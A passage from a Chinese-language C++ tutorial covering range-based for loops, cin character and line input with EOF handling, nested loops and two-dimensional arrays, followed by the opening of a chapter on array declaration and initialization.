(off-by-one errors)。 语法: 12345for (declaration : range_expression) &#123; // 循环体 // 使用 declaration 访问当前元素 statement;&#125; declaration: 声明一个变量，其类型应与 range_expression 中元素的类型兼容（或可以转换）。在每次循环迭代中，该变量会被初始化为范围中的当前元素。 通常使用 auto 让编译器自动推断类型。 auto variable: variable 会成为当前元素的副本。修改 variable 不会影响原始序列中的元素。 auto&amp; variable: variable 会成为当前元素的引用。修改 variable 会修改原始序列中的元素。用于需要修改元素或避免复制大型对象开销的情况。 const auto&amp; variable: variable 会成为当前元素的常量引用。不能通过 variable 修改元素，但可以避免复制开销。用于只读访问。 :: 用于分隔声明和范围表达式。 range_expression: 一个可以表示序列的表达式。这通常是： 数组名。 STL 容器对象（如 std::vector, std::array, std::string, std::list 等）。 初始化列表 &#123; ... &#125;。 任何定义了 begin() 和 end() 成员函数或可以通过全局 begin() 和 end() 函数获取迭代器的对象。 执行流程: 循环会自动遍历 range_expression 中的每一个元素。在每次迭代中： 从序列中获取下一个元素。 将该元素的值（或引用）赋给 declaration 中声明的变量。 执行循环体。 重复此过程，直到遍历完序列中的所有元素。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;array&gt; // 为了 std::arrayint main() &#123; // 1. 遍历数组 double prices[] = &#123;19.99, 25.50, 9.75, 100.0&#125;; std::cout &lt;&lt; &quot;Prices (array):&quot;; for (double price : prices) &#123; // price 是每个元素的副本 std::cout &lt;&lt; &quot; &quot; &lt;&lt; price; &#125; std::cout &lt;&lt; std::endl; // 2. 遍历 std::vector std::vector&lt;int&gt; numbers = &#123;1, 2, 3, 4, 5&#125;; std::cout &lt;&lt; &quot;Numbers (vector):&quot;; for (int num : numbers) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; num; &#125; std::cout &lt;&lt; std::endl; // 3. 遍历 std::string std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Characters (string):&quot;; for (char c : message) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; c; &#125; std::cout &lt;&lt; std::endl; // 4. 遍历初始化列表 std::cout &lt;&lt; &quot;Initializer list:&quot;; for (int x : &#123;10, 20, 30, 40&#125;) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; x; &#125; std::cout &lt;&lt; std::endl; // 5. 使用 auto 简化声明 std::array&lt;std::string, 3&gt; fruits &#123;&quot;Apple&quot;, &quot;Banana&quot;, &quot;Cherry&quot;&#125;; std::cout &lt;&lt; &quot;Fruits (array with auto):&quot;; for (auto fruit : fruits) &#123; // fruit 是 std::string 的副本 std::cout &lt;&lt; &quot; &quot; &lt;&lt; fruit; &#125; std::cout &lt;&lt; std::endl; // 6. 使用引用修改元素 (auto&amp;) std::vector&lt;int&gt; scores = &#123;70, 85, 90&#125;; std::cout &lt;&lt; &quot;Original scores:&quot;; for (int score : scores) std::cout &lt;&lt; &quot; &quot; &lt;&lt; score; std::cout &lt;&lt; std::endl; for (auto&amp; score_ref : scores) &#123; // score_ref 是元素的引用 score_ref += 5; // 给每个分数加 5 &#125; std::cout &lt;&lt; &quot;Scores after adding 5:&quot;; for (int score : scores) std::cout &lt;&lt; &quot; &quot; &lt;&lt; score; // 输出修改后的分数 std::cout &lt;&lt; std::endl; // 7. 使用常量引用进行只读访问 (const auto&amp;) std::cout &lt;&lt; &quot;Reading scores (const auto&amp;):&quot;; for (const auto&amp; score_cref : scores) &#123; // score_cref += 1; // 错误! 不能通过常量引用修改 std::cout &lt;&lt; &quot; &quot; &lt;&lt; score_cref; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 优点: 简洁: 代码更短，意图更清晰（“对范围中的每个元素做某事”）。 安全: 避免了手动管理索引或迭代器可能导致的错误（如越界访问、迭代器失效等）。 通用: 适用于所有定义了 begin() 和 end() 的标准容器以及内置数组和初始化列表。 局限性: 无法直接获取索引: 如果在循环中需要知道当前元素的索引，基于范围的 for 循环本身不提供这个信息。需要额外维护一个计数器变量。 123456std::vector&lt;int&gt; data = &#123;100, 200, 300&#125;;int index = 0;for (int val : data) &#123; std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; index &lt;&lt; &quot;: &quot; &lt;&lt; val &lt;&lt; std::endl; index++;&#125; 遍历整个范围: 它总是从头到尾遍历整个范围。如果需要更复杂的遍历模式（如反向、跳跃、只遍历部分范围），传统的 for 循环或 while 循环配合迭代器可能更合适。 修改容器大小: 在循环体内修改容器的大小（例如，在 vector 中 push_back 或 erase）通常是不安全的，可能导致迭代器失效和未定义行为。基于范围的 for 循环不适合这种情况。 总结: 基于范围的 for 循环是 C++11 提供的一个非常有用的特性，极大地简化了对序列中所有元素的遍历操作。在不需要索引且需要遍历整个序列的情况下，它通常是比传统 for 循环更优选、更安全、更易读的选择。 5.5 循环和文本输入循环结构在处理文本输入时非常有用，特别是当我们需要逐个字符或逐行读取数据，直到满足某个条件（如遇到特定字符、文件结束或达到一定数量）时。本节将探讨使用 cin 及其相关方法进行文本输入的常见模式和技巧。 5.5.1 使用原始的cin进行输入我们已经知道，使用 cin &gt;&gt; variable 可以从标准输入读取数据。当用于读取文本（如 char 或 string）时，cin &gt;&gt; 的行为特点是： 跳过空白: 它会自动忽略输入流中开头的任何空白字符（空格、制表符、换行符）。 读取直到空白: 它会读取非空白字符，直到遇到下一个空白字符为止。 空白符留在流中: 停止读取时遇到的那个空白字符会留在输入流（输入缓冲区）中，等待下一次读取操作。 这使得 cin &gt;&gt; 适合读取单个单词或以空白分隔的数据项，但不适合读取包含空格的整行文本或精确地逐个字符处理（包括空格）。 用法与示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; char ch; std::string word; std::cout &lt;&lt; &quot;Enter some characters (e.g., &#x27;a b c&#x27;): &quot;; // 读取第一个非空白字符 std::cin &gt;&gt; ch; std::cout &lt;&lt; &quot;First char read: &#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; // 如果输入 &quot; a b c&quot;, 这里会读到 &#x27;a&#x27; // 读取下一个单词 std::cin &gt;&gt; word; std::cout &lt;&lt; &quot;Next word read: \\&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 会读到 &quot;b&quot; // 再次读取字符 std::cin &gt;&gt; ch; std::cout &lt;&lt; &quot;Next char read: &#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; // 会读到 &#x27;c&#x27; // 循环读取单词直到输入结束 (例如按 Ctrl+Z/Ctrl+D) std::cout &lt;&lt; &quot;\\nEnter words (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; while (std::cin &gt;&gt; word) &#123; // cin &gt;&gt; word 在成功读取时返回 true std::cout &lt;&lt; &quot;Read word: &quot; &lt;&lt; word &lt;&lt; std::endl; &#125; // 注意：循环结束后，cin 可能处于失败状态 return 0;&#125; while (std::cin &gt;&gt; word) 是一种常见的读取模式，它利用了 cin 对象在成功读取时可以被转换为 true 的特性。当读取失败（例如到达文件末尾或遇到无效输入）时，cin 对象会转换为 false，循环终止。 5.5.2 使用cin.get(char)进行补救cin &gt;&gt; 跳过空白并停止于空白的行为有时不是我们想要的，特别是当我们需要读取包括空格在内的每一个字符时。cin.get(char&amp; ch) 成员函数提供了解决方案。 cin.get(char&amp; ch): 尝试从输入流中读取下一个字符（无论它是什么，包括空格、制表符、换行符）。 如果成功读取，将该字符存储在参数 ch 中，并返回 cin 对象本身（可以转换为 true）。 如果到达文件末尾或发生错误，不修改 ch，并将 cin 置于失败状态（转换为 false）。 这使得 cin.get(char) 非常适合在循环中逐个读取所有字符。 用法与示例: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; char ch; int count = 0; std::cout &lt;&lt; &quot;Enter text (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // 循环读取每一个字符，包括空白符 while (std::cin.get(ch)) &#123; // 尝试读取一个字符到 ch // 成功读取，处理字符 ch std::cout &lt;&lt; ch; // 逐个字符回显 count++; &#125; std::cout &lt;&lt; &quot;\\n--- End of input ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Total characters read: &quot; &lt;&lt; count &lt;&lt; std::endl; return 0;&#125; 这个循环会读取并回显用户输入的所有字符，包括空格和换行，直到遇到文件结束符。 5.5.3 使用哪个cin.get()istream 类（cin 是其对象）实际上提供了几个名为 get 的成员函数（函数重载）： cin.get(char&amp; ch): (已在 5.5.2 讨论) 读取下一个字符到参数 ch 中。 返回 cin 对象。 适合在 while 条件中直接使用 while(cin.get(ch))。 cin.get(): (无参数版本) 读取下一个字符。 返回该字符的整数 ASCII 码（或 wchar_t 对应的值）。 如果到达文件末尾或发生错误，返回特殊值 EOF (End Of File，通常定义为 -1，在 &lt;iostream&gt; 或 &lt;cstdio&gt; 中定义)。 不直接将字符存入变量，需要接收其返回值。 选择依据: cin.get(char&amp; ch): 当你需要将读取的字符直接存储到一个 char 变量中，并且想利用 cin 对象在 while 条件中的布尔转换特性时，这是最常用的选择。 cin.get() (无参数): 当你需要显式地检查文件结束符 EOF 时，或者当你需要获取字符的整数值时，这个版本更合适。返回值需要与 EOF 进行比较。 用法与示例 (cin.get() 无参数版本): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstdio&gt; // 为了 EOF (虽然 iostream 通常也包含)int main() &#123; int ch_int; // 注意类型是 int，以接收 EOF int count = 0; std::cout &lt;&lt; &quot;Enter text (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // 循环读取，直到遇到 EOF while ((ch_int = std::cin.get()) != EOF) &#123; // 读取字符的 int 值并与 EOF 比较 // 成功读取 (不是 EOF) std::cout &lt;&lt; static_cast&lt;char&gt;(ch_int); // 将 int 值转回 char 进行输出 count++; &#125; std::cout &lt;&lt; &quot;\\n--- End of input ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Total characters read: &quot; &lt;&lt; count &lt;&lt; std::endl; return 0;&#125; 两种 get 方法都可以用于逐字符读取，选择哪种取决于你喜欢的判断循环结束的方式（检查 cin 状态还是检查 EOF 返回值）。 5.5.4 文件尾条件当从输入流（如 cin 或文件流）读取数据时，最终会到达输入的末尾，这被称为**文件尾 (End-of-File, EOF)**。程序需要能够检测到 EOF 条件以正常终止读取循环。 有几种方法可以检测 EOF： 检查 cin 状态: cin 对象本身可以转换为布尔值。当读取操作成功时，它转换为 true；当遇到 EOF 或其他错误导致读取失败时，它转换为 false。这是 while (cin &gt;&gt; word) 和 while (cin.get(ch)) 能够工作的原因。 cin.eof(): 如果流是因为到达文件末尾而失败，此函数返回 true。注意: eof() 只有在尝试读取并失败后才会变为 true。不能用它来预测下一次读取是否会到达 EOF。 cin.fail(): 如果发生了非 EOF 的 I/O 错误（例如读取了无效数据类型）或到达 EOF，此函数返回 true。 cin.good(): 如果流处于正常状态（没有设置 eofbit, failbit, badbit），返回 true。 检查 cin.get() 的返回值: 无参数的 cin.get() 在到达 EOF 时返回特殊值 EOF。这是 while ((ch = cin.get()) != EOF) 能够工作的原因。 EOF 的触发: 键盘输入: 通常通过按下特定的组合键来模拟 EOF： Unix/Linux/macOS: Ctrl+D (通常需要在行首按) Windows: Ctrl+Z (通常需要在一行结束后按 Enter，然后再按 Ctrl+Z 再按 Enter) 文件输入: 当读取操作尝试越过文件的最后一个字节时，会触发 EOF。 示例 (使用 cin 状态): 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int main() &#123; int number; int sum = 0; int count = 0; std::cout &lt;&lt; &quot;Enter numbers (non-number or Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // 循环读取，直到 cin 失败 (EOF 或类型不匹配) while (std::cin &gt;&gt; number) &#123; sum += number; count++; &#125; std::cout &lt;&lt; &quot;\\n--- Input finished ---&quot; &lt;&lt; std::endl; // 检查循环结束的原因 if (std::cin.eof()) &#123; std::cout &lt;&lt; &quot;Reason: End-of-File reached.&quot; &lt;&lt; std::endl; &#125; else if (std::cin.fail()) &#123; // fail() 在 eof() 时也可能为 true，但这里我们排除了 eof // 如果是因为类型不匹配（例如输入了字母），fail() 为 true, eof() 为 false std::cout &lt;&lt; &quot;Reason: Invalid input (non-number).&quot; &lt;&lt; std::endl; // 可能需要清除错误状态并忽略无效输入以继续 // std::cin.clear(); // std::cin.ignore(10000, &#x27;\\n&#x27;); &#125; else if (std::cin.bad()) &#123; std::cout &lt;&lt; &quot;Reason: Unrecoverable stream error.&quot; &lt;&lt; std::endl; &#125; if (count &gt; 0) &#123; std::cout &lt;&lt; &quot;Read &quot; &lt;&lt; count &lt;&lt; &quot; numbers. Sum = &quot; &lt;&lt; sum &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No valid numbers were entered.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 理解如何检测 EOF 对于编写能正确处理输入结束的循环至关重要。最常用的方法是利用 cin 对象或 cin.get() 在 while 条件中的行为。 5.5.5 另一个cin.get()版本除了读取单个字符的 get() 函数外，istream 还提供了用于读取 C 风格字符串（字符数组）的 get() 版本： cin.get(char* buffer, int size, char delimiter = &#39;\\n&#39;): 从输入流中读取字符，并将它们存储到 buffer 指向的字符数组中。 最多读取 size - 1 个字符（为末尾的空字符 \\0 留出空间）。 如果在读取 size - 1 个字符之前遇到 delimiter 字符，则停止读取。 delimiter 字符本身不会被读取到 buffer 中，而是会留在输入流中。 (这是与 getline 的主要区别之一)。 读取结束后，总会在 buffer 的末尾添加一个空字符 \\0。 返回 cin 对象。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;const int BUFFER_SIZE = 20;int main() &#123; char name[BUFFER_SIZE]; char address[BUFFER_SIZE]; std::cout &lt;&lt; &quot;Enter your name (max &quot; &lt;&lt; BUFFER_SIZE - 1 &lt;&lt; &quot; chars): &quot;; // 读取最多 BUFFER_SIZE - 1 个字符，或直到遇到换行符 std::cin.get(name, BUFFER_SIZE); // 检查读取是否成功以及是否还有剩余字符（换行符） if (std::cin) &#123; // 检查流状态是否良好 std::cout &lt;&lt; &quot;Name entered: &quot; &lt;&lt; name &lt;&lt; std::endl; // 问题：换行符 &#x27;\\n&#x27; 仍然留在输入流中！ // 如果直接调用下一个 get 或 getline，它会立即读到换行符 // 处理残留的换行符 // 方法1: 读取并丢弃单个字符 (如果是换行符) if (std::cin.peek() == &#x27;\\n&#x27;) &#123; // peek() 查看下一个字符但不读取 std::cin.ignore(); // 读取并丢弃一个字符 &#125; // 方法2: 读取并丢弃直到换行符 (更通用) // std::cin.ignore(10000, &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Enter your address (max &quot; &lt;&lt; BUFFER_SIZE - 1 &lt;&lt; &quot; chars): &quot;; std::cin.get(address, BUFFER_SIZE); if (std::cin) &#123; std::cout &lt;&lt; &quot;Address entered: &quot; &lt;&lt; address &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Error reading address or EOF reached.&quot; &lt;&lt; std::endl; &#125; &#125; else &#123; std::cout &lt;&lt; &quot;Error reading name or EOF reached.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 与 getline(cin, string) 的比较: cin.get(buffer, size): 用于 C 风格字符数组。 需要指定缓冲区大小以防止溢出。 不读取分隔符，分隔符留在流中。 需要手动处理留在流中的分隔符。 getline(cin, str): 用于 std::string 对象。 自动管理内存，无需担心缓冲区溢出。 读取并丢弃分隔符（默认为 \\n）。 通常更方便、更安全。 由于 cin.get(buffer, size) 不读取分隔符并将其留在流中，这常常导致后续输入出现问题。因此，在现代 C++ 中，当需要读取整行文本时，**强烈推荐使用 getline(cin, std::string)**。cin.get(buffer, size) 主要用于需要与 C 风格字符串 API 交互或有特定限制的场景。 5.6 嵌套循环和二维数组嵌套循环 (Nested Loop) 是指一个循环结构完全包含在另一个循环结构的循环体内部。外层循环每执行一次，内层循环会完整地执行一遍（从开始到结束）。嵌套循环常用于处理具有多维结构的数据，例如表格、矩阵或图像的像素。 二维数组 (Two-Dimensional Array) 是数组的一种扩展，可以看作是“数组的数组”。它在概念上像一个表格或网格，有行 (row) 和列 (column)。二维数组是使用嵌套循环处理的典型数据结构。 嵌套循环示例: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; const int ROWS = 3; const int COLS = 4; std::cout &lt;&lt; &quot;Nested loop example (printing coordinates):&quot; &lt;&lt; std::endl; // 外层循环控制行 for (int i = 0; i &lt; ROWS; ++i) &#123; // 内层循环控制列 for (int j = 0; j &lt; COLS; ++j) &#123; // 对于外层循环的每次迭代 (i)，内层循环会完整执行一遍 (j 从 0 到 COLS-1) std::cout &lt;&lt; &quot;(&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; j &lt;&lt; &quot;) &quot;; &#125; std::cout &lt;&lt; std::endl; // 每行结束后换行 &#125; return 0;&#125; 输出: 1234Nested loop example (printing coordinates):(0,0) (0,1) (0,2) (0,3) (1,0) (1,1) (1,2) (1,3) (2,0) (2,1) (2,2) (2,3) 5.6.1 初始化二维数组声明二维数组需要指定两个维度的大小：第一个是行数，第二个是列数。 声明语法: 1typeName arrayName[numberOfRows][numberOfColumns]; 初始化方法: 可以使用嵌套的花括号 &#123;&#125; 来初始化二维数组。外层花括号代表整个数组，内层花括号代表每一行。 完整初始化: 提供所有行的初始化列表。 12345int matrix[3][4] = &#123; // 3 行 4 列 &#123;1, 2, 3, 4&#125;, // 初始化第 0 行 &#123;5, 6, 7, 8&#125;, // 初始化第 1 行 &#123;9, 10, 11, 12&#125; // 初始化第 2 行&#125;; 部分初始化: 如果提供的初始化值不足，剩余元素会被自动初始化为 0（对于数值类型）。 12345678int partial[3][4] = &#123; &#123;1, 2&#125;, // 第 0 行: &#123;1, 2, 0, 0&#125; &#123;5&#125; // 第 1 行: &#123;5, 0, 0, 0&#125; // 第 2 行: &#123;0, 0, 0, 0&#125; (未提供初始化列表)&#125;;// 将整个二维数组初始化为 0int allZeros[10][20] = &#123;0&#125;; // 或 C++11: int allZeros[10][20] &#123;&#125;; 省略行数 (但不能省略列数): 如果在声明时提供了初始化列表，可以省略第一个维度（行数），编译器会根据初始化列表推断行数。但第二个维度（列数）必须指定。 1234int inferredRows[][4] = &#123; // 列数必须是 4 &#123;1, 1, 1, 1&#125;, &#123;2, 2, 2, 2&#125;&#125;; // 编译器推断行数为 2 C++11 列表初始化: 可以省略等号 =。 12int matrix_cpp11[2][3] &#123; &#123;1, 2, 3&#125;, &#123;4, 5, 6&#125; &#125;;int zeros_cpp11[5][5] &#123;&#125;; // 所有元素初始化为 0 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // 完整初始化 int data[2][3] = &#123; &#123;10, 20, 30&#125;, &#123;40, 50, 60&#125; &#125;; // 部分初始化 float coords[3][2] = &#123; &#123;1.1f, 2.2f&#125;, &#123;3.3f&#125; // &#123;3.3f, 0.0f&#125; // 第三行为 &#123;0.0f, 0.0f&#125; &#125;; // 省略行数 char messages[][10] = &#123; // 列数必须指定 &quot;Hello&quot;, &quot;World&quot; &#125;; // 推断为 2 行 10 列 // C++11 初始化 int table[2][2] &#123; &#123;1&#125;, &#123;3, 4&#125; &#125;; // &#123;&#123;1, 0&#125;, &#123;3, 4&#125;&#125; std::cout &lt;&lt; &quot;data[1][1]: &quot; &lt;&lt; data[1][1] &lt;&lt; std::endl; // 输出 50 std::cout &lt;&lt; &quot;coords[1][1]: &quot; &lt;&lt; coords[1][1] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;messages[0]: &quot; &lt;&lt; messages[0] &lt;&lt; std::endl; // 输出 Hello std::cout &lt;&lt; &quot;table[0][1]: &quot; &lt;&lt; table[0][1] &lt;&lt; std::endl; // 输出 0 return 0;&#125; 5.6.2 使用二维数组访问二维数组的元素需要提供两个索引：第一个是行索引，第二个是列索引。索引同样从 0 开始。 访问语法: 1arrayName[rowIndex][columnIndex] 使用嵌套循环处理二维数组: 嵌套循环是处理二维数组所有元素的标准方法。通常，外层循环遍历行，内层循环遍历列。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;const int NUM_CITIES = 3;const int NUM_MONTHS = 4; // 假设只记录 4 个月的数据int main() &#123; // 存储 3 个城市 4 个月的平均气温 double temperatures[NUM_CITIES][NUM_MONTHS] = &#123; &#123;10.5, 12.1, 15.3, 18.0&#125;, // City 0 &#123;8.2, 9.5, 13.0, 16.5&#125;, // City 1 &#123;12.0, 14.5, 17.8, 21.2&#125; // City 2 &#125;; std::cout &lt;&lt; &quot;Monthly average temperatures:&quot; &lt;&lt; std::endl; // 使用嵌套循环遍历并打印所有温度 for (int city = 0; city &lt; NUM_CITIES; ++city) &#123; // 外层循环遍历城市 (行) std::cout &lt;&lt; &quot;City &quot; &lt;&lt; city &lt;&lt; &quot;: &quot;; for (int month = 0; month &lt; NUM_MONTHS; ++month) &#123; // 内层循环遍历月份 (列) std::cout &lt;&lt; temperatures[city][month] &lt;&lt; &quot;\\t&quot;; // 使用行和列索引访问元素 &#125; std::cout &lt;&lt; std::endl; &#125; // 计算 City 1 的总温度和平均温度 double city1_total = 0.0; int city_index = 1; // 要计算的城市索引 for (int month = 0; month &lt; NUM_MONTHS; ++month) &#123; city1_total += temperatures[city_index][month]; &#125; double city1_average = city1_total / NUM_MONTHS; std::cout &lt;&lt; &quot;\\nAverage temperature for City &quot; &lt;&lt; city_index &lt;&lt; &quot;: &quot; &lt;&lt; city1_average &lt;&lt; std::endl; // 计算所有城市第一个月的平均温度 double month0_total = 0.0; int month_index = 0; // 要计算的月份索引 for (int city = 0; city &lt; NUM_CITIES; ++city) &#123; month0_total += temperatures[city][month_index]; &#125; double month0_average = month0_total / NUM_CITIES; std::cout &lt;&lt; &quot;Average temperature for Month &quot; &lt;&lt; month_index &lt;&lt; &quot; across all cities: &quot; &lt;&lt; month0_average &lt;&lt; std::endl; return 0;&#125; 内存布局:在内存中，二维数组通常是按行主序 (Row-Major Order) 存储的。这意味着第一行的所有元素连续存储，然后是第二行的所有元素，依此类推。例如，matrix[3][4] 的内存布局看起来像：matrix[0][0], matrix[0][1], matrix[0][2], matrix[0][3], matrix[1][0], matrix[1][1], ... , matrix[2][3] 理解这一点对于将二维数组传递给函数（通常需要知道列数）或进行某些指针操作很重要。 5.7 总结本章重点介绍了C++中的循环结构和关系表达式，它们是控制程序流程和处理重复任务的基础。 我们学习了三种主要的循环语句： for 循环: 这是一种入口条件循环，其头部包含了初始化、测试条件和更新三个部分，结构清晰，特别适用于计数或已知迭代次数的情况。我们探讨了其组成部分、如何修改步长、使用它访问字符串（C风格和std::string），并详细学习了递增 (++) 和递减 (--) 运算符（包括前缀和后缀形式及其区别、副作用和顺序点问题、在指针上的应用）。此外，还介绍了组合赋值运算符（如 +=, -=）和逗号运算符在 for 循环中的应用。 while 循环: 这也是一种入口条件循环，但结构更简单，只包含一个测试条件。它适用于循环次数不确定、依赖于某个条件持续满足的情况。我们比较了 for 和 while 的适用场景，并了解了如何使用循环（虽然不推荐）以及现代 C++ 的 &lt;chrono&gt; 和 &lt;thread&gt; 库来实现延时。 do while 循环: 这是一种出口条件循环，其特点是循环体至少执行一次，然后在每次迭代结束时检查条件。它适用于需要确保操作至少发生一次的场景，如用户输入验证。 C++11 引入的基于范围的 for 循环提供了一种更简洁、更安全的遍历序列（如数组、vector、string、初始化列表）中所有元素的方式。我们学习了其语法、如何使用 auto、引用 (&amp;) 和常量引用 (const &amp;) 来声明循环变量，以及它的优点和局限性（如无法直接获取索引）。 关系表达式使用关系运算符（&lt;, &gt;, &lt;=, &gt;=, ==, !=）来比较值，结果为布尔值 true 或 false，常用于循环和分支语句的条件判断。我们特别强调了将赋值运算符 (=) 误用为比较运算符 (==) 的常见错误及其后果。对于字符串比较，我们了解到 C 风格字符串需要使用 &lt;cstring&gt; 中的 strcmp() 函数来比较内容，而 std::string 类则可以直接使用重载的关系运算符进行内容的字典序比较。 本章还深入探讨了循环与文本输入的结合。我们分析了 cin &gt;&gt; 读取单词（跳过并停止于空白）的行为，以及如何使用 cin.get(char) 和无参数的 cin.get() 来逐个读取字符（包括空白符）。我们学习了如何检测文件尾 (EOF) 条件以正确终止输入循环，包括检查 cin 流状态和 cin.get() 的返回值。最后，我们了解了读取 C 风格字符串的 cin.get(buffer, size) 版本及其与 getline 的区别（分隔符处理）。 最后，我们学习了嵌套循环的概念，即一个循环包含在另一个循环内部，以及如何使用嵌套循环来处理二维数组（数组的数组）。我们了解了二维数组的初始化方法和如何使用双重索引 [row][col] 配合嵌套循环来访问和处理其所有元素。 通过本章的学习，我们掌握了 C++ 中控制重复执行和进行比较的核心工具，为编写更复杂、更强大的程序奠定了基础。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 4 复合类型","slug":"Cpp_tutorial_Chapter_4","date":"2025-04-26T12:03:35.367Z","updated":"2025-04-26T12:01:30.715Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_4/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_4/","excerpt":"","text":"4.1 数组数组 (Array) 是一种复合类型 (Compound Type)**，它允许你存储多个相同类型的值。数组中的每个值称为一个元素 (Element)，可以通过索引 (Index)** 或下标 (Subscript) 来访问特定元素。 4.1.1 程序说明想象一下，你需要存储一年中每个月的销售额。你可以声明12个独立的 double 变量： 1double salesJan, salesFeb, salesMar, /* ..., */ salesDec; 这种方法非常繁琐，尤其是在需要处理大量数据时。数组提供了一种更简洁、更强大的方式来处理这种情况。 数组声明: 声明一个数组需要指定： 元素类型: 数组中存储的数据类型。 数组名称: 变量名。 数组大小: 数组可以容纳的元素数量，必须是一个常量表达式（在编译时就能确定其值的表达式，例如字面常量、const 常量、枚举量或 sizeof 表达式的结果），并且必须放在方括号 [] 内。 语法: 1typeName arrayName[arraySize]; 示例: 123456789// 声明一个可以存储 12 个 double 类型值的数组，名为 monthlySalesdouble monthlySales[12]; // 声明一个可以存储 5 个 int 类型值的数组，名为 scoresint scores[5];// 使用 const 常量定义数组大小const int NUM_STUDENTS = 30;int studentGrades[NUM_STUDENTS]; 访问数组元素: 使用数组名和方括号内的索引来访问数组元素。C++数组的索引从 0 开始。对于大小为 N 的数组，有效的索引范围是 0 到 N-1。 1234567891011121314// 访问 monthlySales 数组的第一个元素 (一月)monthlySales[0] = 1500.50; // 访问 monthlySales 数组的第三个元素 (三月)monthlySales[2] = 2100.75; // 访问 scores 数组的最后一个元素scores[4] = 95; // 读取 scores 数组的第二个元素int secondScore = scores[1]; std::cout &lt;&lt; &quot;March sales: &quot; &lt;&lt; monthlySales[2] &lt;&lt; std::endl;std::cout &lt;&lt; &quot;Second score: &quot; &lt;&lt; secondScore &lt;&lt; std::endl; 重要: C++ 不会自动检查数组索引是否越界。访问 arrayName[N] 或 arrayName[-1]（对于大小为 N 的数组）是**未定义行为 (Undefined Behavior)**，可能导致程序崩溃或数据损坏。程序员有责任确保使用的索引在有效范围内 (0 到 arraySize - 1)。 数组大小必须是常量表达式: 1234567int n = 10;// int dynamicArray[n]; // 错误! C++ 标准不允许使用变量作为数组大小 (虽然某些编译器可能作为扩展支持)const int SIZE = 5;int staticArray[SIZE]; // 正确! SIZE 是 const 常量int anotherArray[10]; // 正确! 10 是字面常量 如果需要在运行时确定数组大小，应该使用动态内存分配（new）或标准库提供的容器（如 std::vector），我们将在后续章节学习。 4.1.2 数组的初始化规则在声明数组时，可以同时对其进行初始化。初始化使用花括号 &#123;&#125; 括起来的**初始化列表 (Initializer List)**。 规则: 完整初始化: 提供与数组大小相同数量的初始值。 12int scores[5] = &#123;90, 85, 92, 78, 88&#125;; // scores[0]=90, scores[1]=85, ..., scores[4]=88double lengths[3] = &#123;1.2, 3.4, 0.5&#125;; 部分初始化: 如果提供的初始值数量少于数组大小，则剩余的元素会被自动初始化为 0（对于数值类型）或相应的零等价值（对于其他类型，如字符数组的空字符 \\0）。 1234567int counts[10] = &#123;1, 2, 3&#125;; // counts[0]=1, counts[1]=2, counts[2]=3 // counts[3] 到 counts[9] 都被初始化为 0float readings[5] = &#123;9.8f&#125;; // readings[0]=9.8f, 其他元素为 0.0f// 将数组所有元素初始化为 0 的常用方法int allZeros[100] = &#123;0&#125;; 省略数组大小: 如果在声明时提供了初始化列表，可以省略方括号中的数组大小。编译器会根据初始化列表中的元素数量自动推断数组大小。 12short values[] = &#123;10, 20, 30, 40&#125;; // 编译器推断数组大小为 4char message[] = &#123;&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;\\0&#x27;&#125;; // 大小为 6 (包括空字符) 不允许初始化列表元素过多: 初始化列表中的元素数量不能超过数组声明的大小。 1// int errors[3] = &#123;1, 2, 3, 4&#125;; // 错误! 初始化列表元素过多 未初始化数组: 如果在声明数组时没有提供初始化列表（仅适用于非静态局部数组），则数组元素的值是未定义的 (indeterminate)**，它们会包含内存中遗留的垃圾值。使用未初始化的变量是常见的错误来源。** 12345678int main() &#123; int garbage[5]; // 数组元素的值是未定义的 (垃圾值) // std::cout &lt;&lt; garbage[0]; // 错误! 使用未初始化的值 static int staticGarbage[5]; // 静态存储数组会被默认初始化为 0 // std::cout &lt;&lt; staticGarbage[0]; // 输出 0 return 0;&#125; (静态存储持续性的变量，如全局变量、命名空间变量、静态局部变量，会被默认零初始化) 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int 